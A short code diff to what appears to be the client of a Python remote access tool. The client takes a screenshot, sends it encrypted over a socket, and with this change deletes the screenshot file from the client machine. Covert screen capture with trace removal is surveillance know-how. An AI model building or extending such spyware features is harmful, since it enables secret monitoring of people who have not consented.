@@ -10,6 +10,7 @@ import socket
 import subprocess
 import struct
 import sys
+import os
 
 from core import common
 from core import crypto
@@ -101,6 +102,13 @@ def main():
             fname = 'screenshot.jpg'
             screenshot.take_screenshot(fname)
             filesock.sendfile(s, fname, dh_key)
+
+            # delete screenshot from client
+            try:
+                os.remove(fname)
+            except OSError:
+                pass
+
 
 if __name__ == '__main__':
     main()
